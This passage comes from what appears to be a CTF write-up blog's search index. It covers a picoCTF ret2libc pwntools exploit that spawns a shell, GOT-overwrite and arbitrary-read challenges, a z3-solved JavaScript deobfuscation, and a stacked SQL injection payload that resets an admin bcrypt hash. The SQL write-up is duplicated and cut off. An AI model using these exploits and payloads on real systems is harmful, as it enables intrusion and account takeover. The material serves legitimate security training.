locally:\n$ python3 solve.py [*] './vuln_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'.' [+] Starting local process './vuln_patched': pid 174597 [*] Leaked puts() address: 0x7f191fcada30 [*] Glibc base address: 0x7f191fc2d000 [*] Switching to interactive mode $ ls ld-2.27.so libc.so.6 Makefile solve.py vuln vuln_patched  Let\u0026rsquo;s run it on the remote instance and get the flag:\n$ python3 solve.py mercury.picoctf.net 24159 [*] './vuln_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'.' [+] Opening connection to mercury.picoctf.net on port 24159: Done [*] Leaked puts() address: 0x7f9f791eaa30 [*] Glibc base address: 0x7f9f7916a000 [*] Switching to interactive mode $ ls flag.txt libc.so.6 vuln vuln.c xinet_startup.sh $ cat flag.txt picoCTF{1_\u0026lt;3_sm4sh_st4cking_cf205091ad15ab6d}  Additionally, we can write the exploit using pwntools features:\n#!/usr/bin/env python3 from pwn import context, ELF, log, p64, remote, ROP, sys, u64 context.binary = elf = ELF('vuln_patched') glibc = ELF('libc.so.6', checksec=False) rop = ROP(elf) def get_process(): if len(sys.argv) == 1: return elf.process() host, port = sys.argv[1], int(sys.argv[2]) return remote(host, port) def main(): p = get_process() offset = 136 junk = b'A' * offset payload = junk payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) payload += p64(elf.got.puts) payload += p64(elf.plt.puts) payload += p64(elf.symbols.main) p.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!\\n', payload) p.recvline() puts_addr = u64(p.recvline().strip().ljust(8, b'\\0')) log.info(f'Leaked puts() address: {hex(puts_addr)}') glibc.address = puts_addr - glibc.symbols.puts log.info(f'Glibc base address: {hex(glibc.address)}') payload = junk payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) payload += p64(next(glibc.search(b'/bin/sh'))) payload += p64(rop.find_gadget(['ret'])[0]) payload += p64(glibc.symbols.system) p.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!\\n', payload) p.recvline() p.interactive() if __name__ == '__main__': main()  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/heres-a-libc/","section":"ctf","summary":"picoCTF 2021. 90 points. 64-bit binary. Buffer Overflow. Ret2Libc","time":8,"title":"Here's a LIBC"},{"contents":"The challenge introduces us to ROXy, a coder that specializes in short cryptic hard to decipher secret codes.\nWe are given these hexadecimal values and we know that she has done something with them to generate a secret code:\n0xc4115 0x4cf8  Actually, the name ROXy is a hint because she is using XOR cipher. If we operate both numbers using XOR, we get the secret code:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; hex(0xc4115 ^ 0x4cf8) '0xc0ded'  So the flag is: CTFlearn{0xc0ded}.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/cryptography/hextraordinary/","section":"ctf","summary":"XOR cipher","time":1,"title":"Hextraordinary"},{"contents":"We are given a binary called highlighter:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)  If we use Ghidra, we will see the decompiled source code of the main function:\nintmain() { int__fd; longin_FS_OFFSET; undefined8 *where; undefined8 what; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); setbuf(stdin, (char*) 0x0); setbuf(stdout, (char*) 0x0); __fd =open(\"flag.txt\", 0); read(__fd, flag, 100); puts(\"Write what?\"); __isoc99_scanf(\"%ld%*c\", \u0026amp;what); puts(\"Where?\"); __isoc99_scanf(\"%ld%*c\", \u0026amp;where); *where =what; memset(flag, 0, 100); puts(\"Bye!\"); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return0; }  Basically, we have a way to write a value we want into the address we specify (that\u0026rsquo;s known as a write-what-where primitive or arbitrary write primitive). In order to get the flag, notice the use of memset at the end. Using the arbitrary write primitive, we can modify the Global Offset Table (GOT), so that memset points to puts at the Procedure Linkage Table (PLT). This way, we are tricking the binary to execute puts(flag, 0, 100) instead of memset(flag, 0, 100).\nWe can find the values we need with pwntools:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from pwn import ELF \u0026gt;\u0026gt;\u0026gt; elf = ELF('highlighter', checksec=False) \u0026gt;\u0026gt;\u0026gt; elf.got.memset 4210736 \u0026gt;\u0026gt;\u0026gt; elf.plt.puts 4198564 \u0026gt;\u0026gt;\u0026gt; exit()  So, let\u0026rsquo;s do it (this time, we need to enter the values in decimal format):\n$ nc chal.imaginaryctf.org 8091 Write what? 4198564 Where? 4210736 ictf{writing_is_hard_but_satisfying_sometimes} Bye!  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/highlighter/","section":"ctf","summary":"ImaginaryCTF 06/09/2022. 50 points. 64-bit binary. Arbitrary write primitive","time":2,"title":"Highlighter"},{"contents":"We are given a binary called highlights:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)  If we use Ghidra, we will see the decompiled source code of the main function:\nintmain() { undefined8 *address; FILE *fp;  setbuf(stdout, (char*) 0x0); setbuf(stdin, (char*) 0x0); fp =fopen(\"./flag.txt\", \"r\"); __isoc99_fscanf(fp, \"%s\", flag); printf(\"What address (in hex) would you like to read?\\n\u0026gt;\u0026gt;\u0026gt; \"); __isoc99_scanf(\"%lx%c\", \u0026amp;address, \u0026amp;dead); printf(\"Value at 0x%x: %016lx\\n\", address, *address); return0; }  Basically, we have a way to read the value stored at an address we provide (that\u0026rsquo;s an arbitrary read primitive). In Ghidra, we can find the address of flag (which is a global variable). We can find it using readelf as well (0x404080):\n$ readelf -s highlights | grep flag 70: 0000000000404080 128 OBJECT GLOBAL DEFAULT 25 flag  So, let\u0026rsquo;s start dumping the flag:\n$ nc puzzler7.imaginaryctf.org 5000 What address (in hex) would you like to read? \u0026gt;\u0026gt;\u0026gt; 0x404080 Value at 0x404080: 6c6e6f7b66746369 $ nc puzzler7.imaginaryctf.org 5000 What address (in hex) would you like to read? \u0026gt;\u0026gt;\u0026gt; 0x404088 Value at 0x404088: 5f6c6c696b735f79 $ nc puzzler7.imaginaryctf.org 5000 What address (in hex) would you like to read? \u0026gt;\u0026gt;\u0026gt; 0x404090 Value at 0x404090: 706d695f65726f6d $ nc puzzler7.imaginaryctf.org 5000 What address (in hex) would you like to read? \u0026gt;\u0026gt;\u0026gt; 0x404098 Value at 0x404098: 745f746e6174726f $ nc puzzler7.imaginaryctf.org 5000 What address (in hex) would you like to read? \u0026gt;\u0026gt;\u0026gt; 0x4040a0 Value at 0x4040a0: 646165725f6e6168 $ nc puzzler7.imaginaryctf.org 5000 What address (in hex) would you like to read? \u0026gt;\u0026gt;\u0026gt; 0x4040a8 Value at 0x4040a8: 675f73695f676e69 $ nc puzzler7.imaginaryctf.org 5000 What address (in hex) would you like to read? \u0026gt;\u0026gt;\u0026gt; 0x4040b0 Value at 0x4040b0: 7d676e696c676f6f  Notice that I stopped when I saw 7d (} as byte), because it represents the end of the flag. Now we only need to join all hexadecimal values together and represent them as little-endian format in bytes:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from pwn import p64 \u0026gt;\u0026gt;\u0026gt; b''.join(map(lambda x: p64(int(x, 16)), ['6c6e6f7b66746369', '5f6c6c696b735f79', '706d695f65726f6d', '745f746e6174726f', '646165725f6e6168', '675f73695f676e69', '7d676e696c676f6f'])) b'ictf{only_skill_more_important_than_reading_is_googling}'  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/highlights/","section":"ctf","summary":"ImaginaryCTF 05/09/2022. 50 points. 64-bit binary. Arbitrary read primitive","time":2,"title":"Highlights"},{"contents":"We are given an obfuscated JavaScript file called good-luck.js. When running it on a simple HTML document it will show a prompt to validate the flag:\n\u0026lt;!doctypehtml\u0026gt; \u0026lt;htmllang=\"en\"\u0026gt; \u0026lt;head\u0026gt; \u0026lt;metacharset=\"UTF-8\"\u0026gt; \u0026lt;title\u0026gt;Hope you know JS\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;scriptsrc=\"good-luck.js\"\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Making use of Visual Studio Code Prettier formatter, I was able to find some patterns that where repeated along the code. For example, I started substituting expressions like +!![] or ![] by their final value.\nThen I noticed that a function holded some method names like join or length, so I modified all the ocurrences.\nMoreover, there where a lot of calls to parseInt in the following format: parseInt(['1', '0', '0']['join]('')), which simply results in 100.\nSo, after deobfuscating the code at this point, I identified the function that checked the flag (checker):\nletinput=prompt('Please enter your flag', 'Flag') functioncheck(my_input) { return( xde0152f8b3a135c172f6( single_checker(my_input, 0), single_checker(my_input, 1), single_checker(my_input, 2), single_checker(my_input, 3), single_checker(my_input, 4) ) \u0026amp; x923712f54875a51642ea( single_checker(my_input, 5), single_checker(my_input, 6), single_checker(my_input, 7), single_checker(my_input, 8), single_checker(my_input, 9) ) \u0026amp; xaa7b418e981417c0d7e7( single_checker(my_input, 10), single_checker(my_input, 11), single_checker(my_input, 12), single_checker(my_input, 13), single_checker(my_input, 14) ) \u0026amp; // ... x437dc67f1c57b9b1fbfe( single_checker(my_input, 240), single_checker(my_input, 241), single_checker(my_input, 242), single_checker(my_input, 243), single_checker(my_input, 244) ) \u0026amp; xef0469cb269181c1465d( single_checker(my_input, 245), single_checker(my_input, 246), single_checker(my_input, 247), single_checker(my_input, 248), single_checker(my_input, 249) ) ) } check(input) ?console.log('Congrats!') :console.log('Nope :(')  The function called single_checker returns the character of my_input depending on the number at the second argument:\nfunctionsingle_checker(my_input, number) { varindex=0 return( number%0==0\u0026amp;\u0026amp;(x479fa79c4c78b87bf320+=1), number%1==0\u0026amp;\u0026amp;(x24535896a451975e1ead+=1), number%2==0\u0026amp;\u0026amp;(x074117e2c33f667271a2+=1), number%3==0\u0026amp;\u0026amp;(xcdbf3860ed96def693b7+=1), number%4==0\u0026amp;\u0026amp;(x4bae623cbbe71530669c+=1), number%5==0\u0026amp;\u0026amp;(x2fa109dc60f6e5790e5f+=1), number%6==0\u0026amp;\u0026amp;(x0bac59156678535dce64+=1), number%7==0\u0026amp;\u0026amp;(xd1fc6501f139a65febe9+=1), number%8==0\u0026amp;\u0026amp;(x0266c50a73cb1a166c33+=1), number%9==0\u0026amp;\u0026amp;(x9341682b6b6f842b3aef+=1), number%40==0\u0026amp;\u0026amp;(x65a3b4441948a4006f8b+=1), x2fa109dc60f6e5790e5f==6\u0026amp;\u0026amp;((index=(number-20) *6), (index/=2)), number\u0026gt;=30\u0026amp;\u0026amp;number\u0026lt;=34\u0026amp;\u0026amp;(index=number), x65a3b4441948a4006f8b==2\u0026amp;\u0026amp; !x8dd0f0ac7f6bf83c1f50\u0026amp;\u0026amp; (x8dd0f0ac7f6bf83c1f50=true), x8dd0f0ac7f6bf83c1f50\u0026amp;\u0026amp; (number==44\u0026amp;\u0026amp;(x8dd0f0ac7f6bf83c1f50=false), (index=number-40), (index*=3), (x65a3b4441948a4006f8b=100)), number==185\u0026amp;\u0026amp;(index=number-180+8), number==186\u0026amp;\u0026amp;(index=number-180+8), number==187\u0026amp;\u0026amp;(index=-(number-180) +8), number==188\u0026amp;\u0026amp;(index=number-180+8), number==189\u0026amp;\u0026amp;(index=number-180+8), number==2\u0026amp;\u0026amp;(index=2), number==4\u0026amp;\u0026amp;(index=8), number==5\u0026amp;\u0026amp;(index=35), // ... number==242\u0026amp;\u0026amp;(index=28), number==243\u0026amp;\u0026amp;(index=36), my_input[index].charCodeAt(0) ) }  In checker, there are a lot of different functions that take 5 values as arguments. These values are always single_checker(my_input, x) up to single_checker(my_input, x + 4). All this type of functions only use specific parameters. For example, xde0152f8b3a135c172f6:\nfunctionxde0152f8b3a135c172f6( _0x14e395, _0xb878fb, _0x45c9e7, _0x1145fd, _0x2a1381 ) { var_0x30612b=_0x45c9e7*_0x2a1381==2600 return_0x30612b }  It only uses the third and fifth parameters. Remember that the value of the parameters are characters of the flag at specific indeces as ASCII numbers.\nSo, we are left with a set of conditions between the characters of the flag to be met in order to validate the flag.\nThe way I wrote the conditions might not be efficient. I used the Firefox debugger and set breakpoints at the return instruction at all the condition functions. Then, I entered a raw string of 256 ordered ASCII characters, so that the value of the parameters of the function coincide with the actual index:\n$ node Welcome to Node.js v18.10.0. Type \".help\" for more information. \u0026gt; Array.from(Array(256).keys()) [ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, ... 156 more items ] \u0026gt; Array.from(Array(256).keys()).map(n =\u0026gt; String.fromCharCode(n)[0]).join('') '\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\b\\t\\n' + '\\x0B\\f\\r\\x0E\\x0F\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1A\\x1B\\x1C\\x1D\\x1E\\x1F !\"#$%\u0026\\'()*+,-./0123456789:;\u0026lt;=\u0026gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\\x7F\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8A\\x8B\\x8C\\x8D\\x8E\\x8F\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9A\\x9B\\x9C\\x9D\\x9E\\x9F ¡¢£¤¥¦§¨©ª«¬®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ'  Although the conditions can be solved manually, one can use z3 solver to get a flag that is correctly validated. These were the conditions:\ns.add(a[2] *a[8] ==2600) s.add(a[35] -a[39] ==-1) s.add(a[19] +a[37] ==149) s.add(a[20] +a[25] ==200) s.add(a[4] -a[7] ==-49) s.add(a[15] +a[24] -a[27] ==54) s.add(a[18] +a[21] +a[24] -a[27] ==106) s.add(a[30] +a[31] -a[32] +a[33] -a[34] ==48) s.add(a[0] +a[28] ==153) s.add(a[0] -a[6] ==-3) s.add(a[3] +a[9] ==99) s.add(a[3] *a[9] *a[12] ==134640) s.add(a[5] -a[23] ==47) s.add(a[29] +a[36] ==148) s.add(a[10] -a[38] ==50) s.add(a[11] +a[26] ==147) s.add(a[0] +a[22] ==99) s.add(a[4] +a[39] ==103) s.add(a[7] +a[25] ==199) s.add(a[28] -a[37] ==1) s.add(a[11] +a[29] ==146) s.add(a[5] -a[20] ==2) s.add(a[8] +a[38] ==102) s.add(a[19] -a[35] ==-5) s.add(a[19] +a[35] ==101) s.add(a[23] +a[36] ==105) s.add(a[22] -a[26] ==-50) s.add(a[13] +a[19] ==98) s.add(a[5] -a[30] ==4) s.add(a[17] -a[26] ==-50) s.add(a[1] -a[35] ==-2) s.add(a[11] -a[27] ==-3) s.add(a[32] +a[39] ==156) s.add(a[8] +a[14] ==99) s.add(a[10] -a[16] ==2) s.add(a[7] +a[31] ==150) s.add(a[4] -a[33] ==-5) s.add(a[2] -a[34] ==-1) s.add(a[15] +a[20] ==154) s.add(a[18] -a[37] ==-45) s.add(a[1] +a[13] +a[14] +a[16] +a[17] ==298) s.add(a[21] -a[38] ==-1) s.add(a[0] -a[24] ==0) s.add(a[19] +a[25] -a[36] ==98) s.add(-a[0] +a[28] +a[29] ==148) s.add(-a[4] +a[22] +a[23] ==53) s.add(a[2] +a[5] -a[35] ==100) s.add(a[7] +a[20] -a[29] ==100) s.add(a[10] +a[11] -a[26] ==53) s.add(a[8] +a[23] -a[38] ==52) s.add(a[22] +a[37] -a[39] ==95) s.add(a[25] +a[28] -a[36] ==152)  Now, let\u0026rsquo;s solve it:\n$ python3 solve.py 33431e6b20f17217d080c3063eb4faa4f6553e46  Despite being correctly validated by good-luck.js (the original one), it was not the correct flag. The issue is that there are two possible solutions due to these conditions:\ns.add(a[3] +a[9] ==99) s.add(a[3] *a[9] *a[12] ==134640)  The characters a[3] and a[9] are only involved in the above conditions. Since addition and multiplication are commutative, the values of a[3] and a[9] are interchangeable.\nSo, the correct flag was 96:21:33401e6b23f17217d080c3063eb4faa4f6553e46.\nThe full script can be found in here: solve.py.\n","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/other/hope-you-know-js/","section":"ctf","summary":"BlackHat MEA CTF 2022. JavaScript deobfuscation. z3 solver","time":4,"title":"Hope you know JS"},{"contents":"We are given this website:\nStatic code analysis We are also given the Python source code of the web application, built in Flask. Since we are dealing with a login form, let\u0026rsquo;s take a look at the database interaction (application/database.py):\nfromcoloramaimportCursor fromapplication.utilimportgenerate_password_hash, verify_hash, generate_token fromflask_mysqldb importMySQL mysql=MySQL() defquery_db(query, args=(), one=False): withopen('/tmp/log', 'a') asf: f.write(query+'\\n') cursor=mysql.connection.cursor() cursor.execute(query, args) rv=[dict((cursor.description[idx][0], value) foridx, valueinenumerate(row)) forrowincursor.fetchall()] return(rv[0] ifrvelseNone) ifoneelserv deflogin(username, password): user=query_db('SELECT password FROM users WHERE username = %s', (username,), one=True) ifuser: password_check=verify_hash(password, user.get('password')) ifpassword_check: token=generate_token(username) returntoken else: returnFalse else: returnFalse defregister(username, password): exists=query_db('SELECT * FROM users WHERE username = %s', (username,))  ifexists: returnFalse  hashed=generate_password_hash(password) query_db(f'INSERT INTO users (username, password) VALUES (\"{username}\", \"{hashed}\")') mysql.connection.commit() returnTrue  Indeed, there\u0026rsquo;s something exploitable here.\nSQL injection The register function is vulnerable to SQL injection, because the username variable is inserted directly in the query, without sanitization or prepared statements (like the rest of the queries).\nThe vulnerability appears because we can enter a username containing a double quote and escape the context. For instance, we can use asdf\u0026quot;, \u0026quot;password\u0026quot;)-- - as username; this would be the resulting SQL query:\nINSERTINTOusers (username, password) VALUES(\"asdf\", \"password\")-- -\", \"{hashed}\")  Taking a look at entrypoint.sh, we can see how the database is configured:\n#!/bin/ash # Secure entrypoint chmod 600 /entrypoint.sh # Initialize \u0026amp; Start MariaDB mkdir -p /run/mysqld chown -R mysql:mysql /run/mysqld mysql_install_db --user=mysql --ldata=/var/lib/mysql mysqld --user=mysql --console --skip-networking=0 \u0026amp; # Wait for mysql to start while!mysqladmin ping -h'localhost'--silent;doecho'not up'\u0026amp;\u0026amp;sleep .2;done mysql -u root \u0026lt;\u0026lt;EOF CREATE DATABASE horror_feeds; CREATE TABLE horror_feeds.users ( id INTEGER PRIMARY KEY AUTO_INCREMENT, username varchar(255) NOT NULL UNIQUE, password varchar(255) NOT NULL ); INSERT INTO horror_feeds.users (username, password) VALUES ('admin', '$2a$12$BHVtAvXDP1xgjkGEoeqRTu2y4mycnpd6If0j/WbP0PCjwW4CKdq6G'); CREATE USER 'user'@'localhost' IDENTIFIED BY 'M@k3l@R!d3s$'; GRANT SELECT, INSERT, UPDATE ON horror_feeds.usersTO 'user'@'localhost'; FLUSH PRIVILEGES; EOF /usr/bin/supervisord -c /etc/supervisord.conf  So the database user is able to use SELECT, INSERT and UPDATE. Moreover, USERNAME attribute must be unique.\nHash function The server uses bcrypt to compute the password hashes (application/util.py):\ndefgenerate_password_hash(password): salt=bcrypt.gensalt() returnbcrypt.hashpw(password.encode(), salt).decode() defverify_hash(password, passhash): returnbcrypt.checkpw(password.encode(), passhash.encode())  Let\u0026rsquo;s compute a hash for asdf:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; import bcrypt \u0026gt;\u0026gt;\u0026gt; bcrypt.hashpw(b'asdf', bcrypt.gensalt()) b'$2b$12$lUMUckkeJqTGd.2ffCNH/uHuqmvId5PtzayQgYX4jBsYE6RUSFiNO'  Exploitation The flag will be shown as long as we authenticate as admin (which is already stored in the database, with an unknown password):\n{% if user == 'admin' %} \u0026lt;divclass=\"container-lg mt-5 pt-5\"\u0026gt; \u0026lt;h5class=\"m-3 ms-0\"\u0026gt;Firmware Settings\u0026lt;/h5\u0026gt; \u0026lt;h6class=\"m-4 ms-0 text-grey\"\u0026gt;Upgrade Firmware\u0026lt;/h6\u0026gt; \u0026lt;divclass=\"d-flex align-items-center\"\u0026gt; \u0026lt;imgsrc=\"/static/images/folder.png\"height=\"25px\"class=\"sw-img\"\u0026gt; \u0026lt;spanclass=\"fw-bold sw-text\"\u0026gt;Software Folder\u0026lt;/span\u0026gt; \u0026lt;inputtype=\"text\"class=\"form-control sw-path\"value=\"/opt/horrorfeeds/Firmware/\"disabled\u0026gt; \u0026lt;/div\u0026gt;  \u0026lt;tableclass=\"table table-hover fw-table text-center\"\u0026gt; \u0026lt;!-- ... --\u0026gt; \u0026lt;trclass=\"table-active\"\u0026gt; \u0026lt;th\u0026gt; \u0026lt;inputclass=\"form-check-input fw-cam-radio\"type=\"checkbox\"checkeddisabled\u0026gt; \u0026lt;/th\u0026gt; \u0026lt;td\u0026gt;5\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;192.251.68.6\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;NV360\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;{{flag}}\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;admin\u0026lt;/td\u0026gt; \u0026lt;!-- ... --\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;divclass=\"d-flex justify-content-end mt-3 mb-3\"\u0026gt; \u0026lt;buttonclass=\"btn btn-info fw-update-btn me-3\"\u0026gt;Upgrade Selected\u0026lt;/button\u0026gt; \u0026lt;buttonclass=\"btn btn-danger fw-update-btn\"\u0026gt;Disable Feeds\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt;  \u0026lt;/div\u0026gt; {% endif %} \u0026lt;!-- ... --\u0026gt;  So, the idea is to update the password hash for admin, so that we can access as admin using asdf as password. Therefore, we must enter the following payload as username:\nx\", \"x\"); UPDATE users SET password=\"$2b$12$lUMUckkeJqTGd.2ffCNH/uHuqmvId5PtzayQgYX4jBsYE6RUSFiNO\"-- -  So that the SQL query is:\nINSERTINTOusers (username, password) VALUES(\"x\", \"x\"); UPDATEusers SETpassword=\"$2b$12$lUMUckkeJqTGd.2ffCNH/uHuqmvId5PtzayQgYX4jBsYE6RUSFiNO\"-- -\", \"{hashed}\")  Nevertheless, the above payload is not complete. The UPDATE statement won\u0026rsquo;t be executed because of how SQL transactions work. By default, a single query must perform a single operation on the database (ACID model). In order to force the UPDATE statement, we must enter COMMIT at the end:\nx\", \"x\"); UPDATE users SET password=\"$2b$12$lUMUckkeJqTGd.2ffCNH/uHuqmvId5PtzayQgYX4jBsYE6RUSFiNO\"; COMMIT-- -  After that, we can access as admin using asdf as password:\nFlag And there we have the flag (HTB{1ns3rt_int0_sql1_1s_ind33d_w0rs3_th4n_s3l3ct!!}):\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/horror-feeds/","section":"ctf","summary":"Stack-based SQL injection","time":3,"title":"Horror Feeds"},{"contents":"We are given this website:\nStatic code analysis We are also given the Python source code of the web application, built in Flask. Since we are dealing with a login form, let\u0026rsquo;s take a look at the database interaction (application/database.py):\nfromcoloramaimportCursor fromapplication.utilimportgenerate_password_hash, verify_hash, generate_token fromflask_mysqldb importMySQL mysql=MySQL() defquery_db(query, args=(), one=False): withopen('/tmp/log', 'a') asf: f.write(query+'\\n') cursor=mysql.connection.cursor() cursor.execute(query, args) rv=[dict((cursor.description[idx][0], value) foridx, valueinenumerate(row)) forrowincursor.fetchall()] return(rv[0] ifrvelseNone) ifoneelserv deflogin(username, password): user=query_db('SELECT password FROM users WHERE username = %s', (username,), one=True) ifuser: password_check=verify_hash(password, user.get('password')) ifpassword_check: token=generate_token(username) returntoken else: returnFalse else: returnFalse defregister(username, password): exists=query_db('SELECT * FROM users WHERE username = %s', (username,))  ifexists: returnFalse  hashed=generate_password_hash(password) query_db(f'INSERT INTO users (username, password) VALUES (\"{username}\", \"{hashed}\")') mysql.connection.commit() returnTrue  Indeed, there\u0026rsquo;s something exploitable here.\nSQL injection The register function is vulnerable to SQL injection, because the username variable is inserted directly in the query, without sanitization or prepared statements (like the rest of the queries).\nThe vulnerability appears because we can enter a username containing a double quote and escape the context. For instance, we can use asdf\u0026quot;, \u0026quot;password\u0026quot;)-- - as username; this would be the resulting SQL query:\nINSERTINTOusers (username, password) VALUES(\"asdf\", \"password\")-- -\", \"{hashed}\")  Taking a look at entrypoint.sh, we can see how the database is configured:\n#!/bin/ash # Secure entrypoint chmod 600 /entrypoint.sh # Initialize \u0026amp; Start MariaDB mkdir -p /run/mysqld chown -R mysql:mysql /run/mysqld mysql_install_db --user=mysql --ldata=/var/lib/mysql mysqld --user=mysql --console --skip-networking=0 \u0026amp; # Wait for mysql to start while!mysqladmin ping -h'localhost'--silent;doecho'not up'\u0026amp;\u0026amp;sleep .2;done mysql -u root \u0026lt;\u0026lt;EOF CREATE DATABASE horror_feeds; CREATE TABLE horror_feeds.users ( id INTEGER PRIMARY KEY AUTO_INCREMENT, username varchar(255) NOT NULL UNIQUE, password varchar(255) NOT NULL ); INSERT INTO horror_feeds.users (username, password) VALUES ('admin', '$2a$12$BHVtAvXDP1xgjkGEoeqRTu2y4mycnpd6If0j/WbP0PCjwW4CKdq6G'); CREATE USER 'user'@'localhost' IDENTIFIED BY 'M@k3l@R!d3s$'; GRANT SELECT, INSERT, UPDATE ON horror_feeds.usersTO 'user'@'localhost'; FLUSH PRIVILEGES; EOF /usr/bin/supervisord -c /etc/supervisord.conf  So the database user is able to use SELECT, INSERT and UPDATE. Moreover, USERNAME attribute must be unique.\nHash function The server uses bcrypt to compute the password hashes (application/util.py):\ndefgenerate_password_hash(password): salt=bcrypt.gensalt() returnbcrypt.hashpw(password.encode(), salt).decode() defverify_hash(password, passhash): returnbcrypt.checkpw(password.encode(), passhash.encode())  Let\u0026rsquo;s compute a hash for asdf:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; import bcrypt \u0026gt;\u0026gt;\u0026gt; bcrypt.hashpw(b'asdf', bcrypt.gensalt()) b'$2b$12$lUMUckkeJqTGd.2ffCNH/uHuqmvId5PtzayQgYX4jBsYE6RUSFiNO'  Exploitation The flag will be shown as long as we authenticate as admin (which is already stored in the database, with an unknown password):\n{% if user == 'admin' %} \u0026lt;divclass=\"container-lg mt-5 pt-5\"\u0026gt; \u0026lt;h5class=\"m-3 ms-0\"\u0026gt;Firmware Settings\u0026lt;/h5\u0026gt; \u0026lt;h6class=\"m-4 ms-0 text-grey\"\u0026gt;Upgrade Firmware\u0026lt;/h6\u0026gt; \u0026lt;divclass=\"d-flex align-items-center\"\u0026gt; \u0026lt;imgsrc=\"/static/images/folder.png\"height=\"25px\"class=\"sw-img\"\u0026gt; \u0026lt;spanclass=\"fw-bold sw-text\"\u0026gt;Software Folder\u0026lt;/span\u0026gt; \u0026lt;inputtype=\"text\"class=\"form-control sw-path\"value=\"/opt/horrorfeeds/Firmware/\"disabled\u0026gt; \u0026lt;/div\u0026gt;  \u0026lt;tableclass=\"table table-hover fw-table text-center\"\u0026gt; \u0026lt;!-- ... --\u0026gt; \u0026lt;trclass=\"table-active\"\u0026gt; \u0026lt;th\u0026gt; \u0026lt;inputclass=\"form-check-input fw-cam-radio\"type=\"checkbox\"checkeddisabled\u0026gt; \u0026lt;/th\u0026gt; \u0026lt;td\u0026gt;5\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;192.251.68.6\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;NV360\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;{{flag}}\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;admin\u0026lt;/td\u0026gt; \u0026lt;!-- ... --\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;divclass=\"d-flex justify-content-end mt-3 mb-3\"\u0026gt; \u0026lt;buttonclass=\"btn btn-info fw-update-btn me-3\"\u0026gt;Upgrade Selected\u0026lt;/button\u0026gt; \u0026lt;buttonclass=\"btn btn-danger fw-update-btn\"\u0026gt;Disable Feeds\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt;  \u0026lt;/div\u0026gt; {% endif %} \u0026lt;!-- ... --\u0026gt;  So, the idea is to update the password hash for admin, so that we can access as admin using asdf as password. Therefore, we must enter the following payload as username:\nx\", \"x\"); UPDATE users SET password=\"$2b$12$lUMUckkeJqTGd.2ffCNH/uHuqmvId5PtzayQgYX4jBsYE6RUSFiNO\"-- -  So that the SQL query is:\nINSERTINTOusers (username, password) VALUES(\"x\", \"x\"); UPDATEusers SETpassword=\"$2b$12$lUMUckkeJqTGd.2ffCNH/uHuqmvId5PtzayQgYX4jBsYE6RUSFiNO\"-- -\", \"{hashed}\")  Nevertheless, the above payload is not complete. The UPDATE statement won\u0026rsquo;t be executed because of how SQL transactions work. By default, a single query must perform a single operation on the database (ACID model). In order to force the UPDATE statement, we must enter 